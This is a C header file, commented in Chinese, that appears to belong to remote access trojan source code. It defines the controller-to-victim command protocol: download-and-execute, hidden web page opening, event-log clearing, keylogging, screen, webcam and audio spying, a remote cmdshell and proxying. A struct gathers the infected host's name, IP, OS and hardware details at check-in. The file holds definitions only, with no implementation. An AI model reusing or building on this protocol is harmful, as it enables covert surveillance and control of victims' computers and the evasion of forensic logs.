//通信协议
#define HDR_SIZE	15
#define FLAG_SIZE	3
#define	MAX_WRITE_RETRY			15 // 重试写入文件次数
#define	MAX_SEND_BUFFER			1024 * 8 // 最大发送数据长度
#define MAX_RECV_BUFFER			1024 * 8 // 最大接收数据长度
#define ZLIB_NO  0001		//数据包无压缩模式
#define ZLIB_OK  0002		//数据包为压缩模式

enum
{
	// 控制端发出的命令

	COMMAND_SESSION = 0,			// 会话管理（关机，重启，注销, 卸载）
	COMMAND_UNINSTALL,              // 卸载
	COMMAND_RENAME_REMARK,          // 更改备注
	COMMAND_CHANGEDLLINFO,          // 查询配置
	COMMAND_CHANGE_GROUP,           // 更改分组
	COMMAND_CLEAN_EVENT,            // 清理日志
		
	// 其他功能
	COMMAND_DOWN_EXEC,              // 下载执行
	COMMAND_DOWN_UPDATE,            // 下载更新
	COMMAND_OPEN_URL_SHOW,          // 打开网页（显示）
	COMMAND_OPEN_URL_HIDE,          // 打开网页（隐藏）
	COMMAND_LOCAL_UPLOAD,           // 本地上传
	COMMAND_MESSAGEBOX,             // Messagebox
		
	// 筛选
	COMMAND_FIND_PROCESS,           // 查找进程
	COMMAND_FIND_WINDOW,            // 查找窗口
	
	COMMAND_OPEN_PROXY,             // 开启代理
	COMMAND_CLOSE_PROXY,            // 关闭代理
 
	COMMAND_PRANK,                  // 恶 作 剧

	// 主要功能
	COMMAND_NEXT = 100,				// 下一步(控制端已经打开对话框)
	COMMAND_LIST_DRIVE,	            // 文件管理(列出磁盘目录) 
	COMMAND_SCREEN_SPY,				// 屏幕监控
	COMMAND_WEBCAM,					// 摄像头监控
	COMMAND_AUDIO,                  // 语音监听
	COMMAND_SHELL,					// cmdshell
	COMMAND_SYSTEM,                 // 系统管理
	COMMAND_KEYBOARD,				// 键盘记录
	COMMAND_SERVICE_MANAGER,	    // 服务管理	
	COMMAND_REGEDIT,                // 注 册 表
	COMMAND_TEXT_CHAT,              // 文字聊天
	COMMAND_PROXY_MAP,				// proxy

	// 预留 
	COMMAND_PLUGINME,

/////////////////////////////////////////////////////////////////////////////////////////

	// 服务端发出的标识
	TOKEN_LOGIN = 200,				// 上线包
	TOKEN_DRIVE_LIST,				// 文件管理（驱动器列表）
	TOKEN_BITMAPINFO,				// 屏幕监控（屏幕查看的BITMAPINFO）
	TOKEN_WEBCAM_BITMAPINFO,		// 摄像头（摄像头的BITMAPINFOHEADER）
	TOKEN_SHELL_START,              // CMD
	TOKEN_AUDIO_START,				// 开始语音监听
	TOKEN_PSLIST,					// 进程列表
	TOKEN_KEYBOARD_START,			// 键盘记录开始
	TOKEN_SERVICE_LIST,             // 服务列表
	TOKEN_REGEDIT,                  // 注册表开始
	TOKEN_TEXTCHAT_START,           // 文字聊天开始
	TOKEN_PROXY_START,              // 代理映射开始

	// 其他
	TOKEN_FIND_YES,                 // 查找存在
	TOKEN_DLLINFO,                  // 查看配置

	// 预留
};

typedef struct
{	
	BYTE			bToken;			// = 1
	char			UpGroup[32];	// 上线分组
	IN_ADDR	    	IPAddress;	// 存储32位的IPv4的地址数据结构
	char			HostName[50];	// 主机名
	OSVERSIONINFOEXA	OsVerInfoEx;	// 版本信息
	DWORD			dwMajorVer;		// 系统主版本
	DWORD			dwMinorVer;		// 系统次版本
	DWORD			dwBuildNumber;	// 系统Build版本
	char			CPUClockMhz[20];// CPU信息
	DWORD			dwSpeed;		// 网速
	UINT			bIsWebCam;		// 是否有摄像头
	bool            bIsWow64;
	DWORD           dwMemSize;
	char            szInstallTime[50];
}LOGININFO;
